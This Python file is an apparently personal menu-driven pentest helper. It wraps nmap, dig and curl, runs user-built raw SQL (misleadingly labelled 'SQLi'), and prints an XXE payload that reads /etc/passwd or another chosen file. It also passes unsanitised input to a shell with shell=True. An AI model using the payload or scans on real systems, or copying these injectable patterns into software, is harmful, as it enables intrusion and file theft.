import sys
import subprocess

# Try to import MySQL and PostgreSQL libraries
try:
    import mysql.connector
except ImportError:
    mysql = None
try:
    import psycopg2
except ImportError:
    psycopg2 = None
import sqlite3

def run_command(command):
    """
    Executes a shell command and prints its output and errors.
    Used for running system commands like nmap, dig, curl, etc.
    """
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        if e.stdout:
            print(e.stdout)
        if e.stderr:
            print(e.stderr)

def main_menu():
    """
    Displays the main menu and routes the user to the selected submenu or command.
    """
    while True:
        print("==== Command Menu ====")
        print("1. Vhost")
        print("2. nmap")
        print("3. dig")
        print("4. curl")
        print("5. SQLi")
        print("6. XXE")
        print("7. Exit")
        choice = input("Choose an option [1-7]: ").strip()

        if choice == '1':
            vhost_menu()
        elif choice == '2':
            nmap_menu()
        elif choice == '3':
            dig_menu()
        elif choice == '4':
            curl_menu()
        elif choice == '5':
            sqli_menu()
        elif choice == '6':
            xxe_menu()
        elif choice == '7':
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid option. Please try again.\n")

def vhost_menu():
    """
    Prompts the user for Vhost details and runs the vhost command (placeholder).
    """
    domain = input("Enter domain: ").strip()
    auth_server = input("Enter authoritative server: ").strip()
    print(f"You chose Vhost with domain: {domain} and authoritative server: {auth_server}")
    command = f"vhost_command --domain {domain} --auth-server {auth_server}"
    run_command(command)

def nmap_menu():
    """
    Displays the nmap submenu, prompts for scan type and target, and runs the selected nmap command.
    """
    while True:
        print("--- nmap Submenu ---")
        print("1. Silent scan")
        print("2. Full port scan")
        print("3. Service scan")
        print("4. Back")
        choice = input("Choose an nmap scan [1-4]: ").strip()
        if choice == '1':
            target = input("Enter target: ").strip()
            command = f"nmap -sS -T4 {target}"
            run_command(command)
        elif choice == '2':
            target = input("Enter target: ").strip()
            command = f"nmap -p- {target}"
            run_command(command)
        elif choice == '3':
            target = input("Enter target: ").strip()
            command = f"nmap -sV {target}"
            run_command(command)
        elif choice == '4':
            break
        else:
            print("Invalid option. Please try again.\n")

def dig_menu():
    """
    Displays the dig submenu, prompts for query type and target, and runs the selected dig command.
    Now includes advanced options and more record types based on user notes.
    """
    while True:
        print("--- dig Submenu ---")
        print("1. Default A record lookup")
        print("2. A record (IPv4)")
        print("3. AAAA record (IPv6)")
        print("4. MX record (Mail servers)")
        print("5. NS record (Name servers)")
        print("6. TXT record")
        print("7. CNAME record")
        print("8. SOA record")
        print("9. ANY record (all records)")
        print("10. Specify DNS server")
        print("11. +trace (show DNS resolution path)")
        print("12. +short (concise answer)")
        print("13. +noall +answer (only answer section)")
        print("14. Reverse lookup (PTR)")
        print("15. Back")
        choice = input("Choose a dig query [1-15]: ").strip()
        if choice == '1':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain}"
            run_command(command)
        elif choice == '2':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} A"
            run_command(command)
        elif choice == '3':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} AAAA"
            run_command(command)
        elif choice == '4':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} MX"
            run_command(command)
        elif choice == '5':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} NS"
            run_command(command)
        elif choice == '6':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} TXT"
            run_command(command)
        elif choice == '7':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} CNAME"
            run_command(command)
        elif choice == '8':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} SOA"
            run_command(command)
        elif choice == '9':
            domain = input("Enter domain: ").strip()
            command = f"dig {domain} ANY"
            run_command(command)
        elif choice == '10':
            dns_server = input("Enter DNS server (IP or hostname): ").strip()
            domain = input("Enter domain: ").strip()
            command = f"dig @{dns_server} {domain}"
            run_command(command)
        elif choice == '11':
            domain = input("Enter domain: ").strip()
            command = f"dig +trace {domain}"
            run_command(command)
        elif choice == '12':
            domain = input("Enter domain: ").strip()
            command = f"dig +short {domain}"
            run_command(command)
        elif choice == '13':
            domain = input("Enter domain: ").strip()
            command = f"dig +noall +answer {domain}"
            run_command(command)
        elif choice == '14':
            ip = input("Enter IP address: ").strip()
            command = f"dig -x {ip}"
            run_command(command)
        elif choice == '15':
            break
        else:
            print("Invalid option. Please try again.\n")

def curl_menu():
    """
    Prompts for curl options. If Authorization header is chosen, prompts for username and password.
    Otherwise, just prompts for server IP and port, then runs the curl command.
    Always adds -k to allow insecure HTTPS connections.
    """
    use_auth = input("Use Authorization header? (y/n): ").strip().lower()
    if use_auth == 'y':
        username = input("Enter username: ").strip()
        password = input("Enter password: ").strip()
        server_ip = input("Enter server IP: ").strip()
        port = input("Enter port: ").strip()
        command = f"curl -k -u {username}:{password} http://{server_ip}:{port}/"
    else:
        server_ip = input("Enter server IP: ").strip()
        port = input("Enter port: ").strip()
        command = f"curl -k http://{server_ip}:{port}/"
    run_command(command)

def sqli_menu():
    """
    Displays the SQLi database selection menu and routes to the SQL command submenu for the chosen database.
    """
    while True:
        print("--- SQLi: Choose Database ---")
        print("1. SQLite (execute)")
        print("2. MySQL (execute)")
        print("3. PostgreSQL (execute)")
        print("4. Just print SQL")
        print("5. Back")
        db_choice = input("Choose a database [1-5]: ").strip()
        if db_choice == '1':
            sqlite_path = input("Enter SQLite database file path: ").strip()
            sqli_commands_menu('sqlite', sqlite_path)
        elif db_choice == '2':
            if mysql is None:
                print("mysql-connector-python is not installed. Please install it to use MySQL support.\n")
                continue
            host = input("Enter MySQL host: ").strip()
            user = input("Enter MySQL user: ").strip()
            password = input("Enter MySQL password: ").strip()
            database = input("Enter MySQL database: ").strip()
            sqli_commands_menu('mysql', (host, user, password, database))
        elif db_choice == '3':
            if psycopg2 is None:
                print("psycopg2 is not installed. Please install it to use PostgreSQL support.\n")
                continue
            host = input("Enter PostgreSQL host: ").strip()
            user = input("Enter PostgreSQL user: ").strip()
            password = input("Enter PostgreSQL password: ").strip()
            database = input("Enter PostgreSQL database: ").strip()
            sqli_commands_menu('postgres', (host, user, password, database))
        elif db_choice == '4':
            sqli_commands_menu('print', None)
        elif db_choice == '5':
            break
        else:
            print("Invalid option. Please try again.\n")

def sqli_commands_menu(db_type, conn_info):
    """
    Displays the SQL command submenu, builds SQL statements, and executes or prints them
    depending on the selected database type.
    """
    while True:
        print("--- SQLi Submenu ---")
        print("1. SELECT")
        print("2. CREATE")
        print("3. INSERT")
        print("4. UPDATE")
        print("5. DELETE")
        print("6. DROP")
        print("7. Back")
        choice = input("Choose an SQL command [1-7]: ").strip()
        sql = None
        if choice == '1':
            table = input("Enter table name: ").strip()
            columns = input("Enter columns (comma separated, or * for all): ").strip()
            where = input("Enter WHERE clause (or leave blank): ").strip()
            sql = f"SELECT {columns} FROM {table}"
            if where:
                sql += f" WHERE {where}"
            sql += ";"
        elif choice == '2':
            table = input("Enter table name: ").strip()
            columns = input("Enter columns (comma separated): ").strip()
            sql = f"CREATE TABLE {table} ({columns});"
        elif choice == '3':
            table = input("Enter table name: ").strip()
            columns = input("Enter columns (comma separated): ").strip()
            values = input("Enter values (comma separated): ").strip()
            sql = f"INSERT INTO {table} ({columns}) VALUES ({values});"
        elif choice == '4':
            table = input("Enter table name: ").strip()
            set_clause = input("Enter SET clause (e.g., col1='val1', col2='val2'): ").strip()
            where = input("Enter WHERE clause (or leave blank): ").strip()
            sql = f"UPDATE {table} SET {set_clause}"
            if where:
                sql += f" WHERE {where}"
            sql += ";"
        elif choice == '5':
            table = input("Enter table name: ").strip()
            where = input("Enter WHERE clause (or leave blank): ").strip()
            sql = f"DELETE FROM {table}"
            if where:
                sql += f" WHERE {where}"
            sql += ";"
        elif choice == '6':
            table = input("Enter table name: ").strip()
            sql = f"DROP TABLE {table};"
        elif choice == '7':
            break
        else:
            print("Invalid option. Please try again.\n")
            continue
        if sql:
            if db_type == 'sqlite':
                # Execute SQL on SQLite database
                try:
                    conn = sqlite3.connect(conn_info)
                    cur = conn.cursor()
                    cur.execute(sql)
                    if sql.strip().upper().startswith('SELECT'):
                        rows = cur.fetchall()
                        for row in rows:
                            print(row)
                    else:
                        conn.commit()
                        print("Query executed successfully.")
                    cur.close()
                    conn.close()
                except Exception as e:
                    print(f"SQLite error: {e}")
            elif db_type == 'mysql':
                # Execute SQL on MySQL database
                try:
                    host, user, password, database = conn_info
                    conn = mysql.connector.connect(host=host, user=user, password=password, database=database)
                    cur = conn.cursor()
                    cur.execute(sql)
                    if sql.strip().upper().startswith('SELECT'):
                        rows = cur.fetchall()
                        for row in rows:
                            print(row)
                    else:
                        conn.commit()
                        print("Query executed successfully.")
                    cur.close()
                    conn.close()
                except Exception as e:
                    print(f"MySQL error: {e}")
            elif db_type == 'postgres':
                # Execute SQL on PostgreSQL database
                try:
                    host, user, password, database = conn_info
                    conn = psycopg2.connect(host=host, user=user, password=password, dbname=database)
                    cur = conn.cursor()
                    cur.execute(sql)
                    if sql.strip().upper().startswith('SELECT'):
                        rows = cur.fetchall()
                        for row in rows:
                            print(row)
                    else:
                        conn.commit()
                        print("Query executed successfully.")
                    cur.close()
                    conn.close()
                except Exception as e:
                    print(f"PostgreSQL error: {e}")
            elif db_type == 'print':
                # Just print the SQL statement
                print(f"SQL: {sql}\n")

def xxe_menu():
    """
    Prompts for a file path and displays an XML payload for XXE testing that attempts to read the specified file.
    """
    print("\n--- XXE Payload Generator ---")
    file_path = input("Enter the file path to read (default: /etc/passwd): ").strip()
    if not file_path:
        file_path = "/etc/passwd"
    print("\nCopy and use this payload:")
    print("""
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///{file_path}'>]>
<root>&read;</root>
""".replace('{file_path}', file_path))

if __name__ == "__main__":
    main_menu() 